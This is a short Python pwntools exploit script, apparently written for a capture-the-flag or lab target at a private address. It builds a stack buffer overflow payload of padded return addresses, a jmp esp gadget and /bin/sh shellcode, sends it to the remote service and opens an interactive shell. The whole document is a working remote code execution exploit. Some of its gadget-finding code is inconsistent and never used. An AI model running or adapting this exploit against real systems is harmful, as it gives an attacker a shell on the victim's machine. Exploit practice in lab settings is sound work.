from pwn import *
r = remote('192.168.2.83',10040)
ELF.find = lambda self, sig: next(elf.search(sig))
elf = ELF('vulne')

jmp_esp = elf.find('\xff\xff\xf4') + 1
print 'RET gadget at0x%.8x' % jmp_esp

#shellcode
ret = 0x804835a
jmpesp = 0x8048431
context(arch = 'i386', os = 'linux')
shellcode = asm(shellcraft.sh())
payload = p32(ret) * 41 + p32(jmpesp) + shellcode
r.send(payload)
r.interactive()
print(payload)
